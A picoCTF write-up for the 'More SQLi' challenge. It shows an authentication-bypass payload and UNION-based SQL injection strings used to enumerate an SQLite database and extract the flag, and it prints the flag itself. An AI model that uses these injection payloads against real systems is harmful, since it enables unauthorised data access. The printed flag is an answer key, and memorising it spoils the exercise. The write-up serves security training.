# More SQLi

Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:62448/).

-----

Opening the website, we are presented with a login form:

![[picoctf/images/Pasted image 20250225121922.png]]

When we fail to login, we are returned with the query used:

```
username: test
password: test
SQL query: SELECT id FROM users WHERE password = 'test' AND username = 'test'
```

We can therefore manipulate the query and perform SQLi:

```
test' OR 1=1 -- -
```

This results in a successful login which redirects us to the following search page:

![[picoctf/images/Pasted image 20250225122032.png]]

Testing a `UNION` works:

```
1' UNION SELECT 1,2,3 -- -
```

![[picoctf/images/Pasted image 20250225122502.png]]

We can check the version of the database:

```
1' UNION SELECT 1, sqlite_version(), 3 -- -
```

![[picoctf/images/Pasted image 20250225122624.png]]

As we have confirmed it is using SQLite, we can list all the tables from `sqlite_master`:

```
1' UNION SELECT name, sql, null from sqlite_master -- -
```

![[picoctf/images/Pasted image 20250225122723.png]]

We can therefore retrieve the flag from `more_tables`:

```
1' UNION SELECT flag, null, null from more_table -- 
```

![[picoctf/images/Pasted image 20250225122955.png]]

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```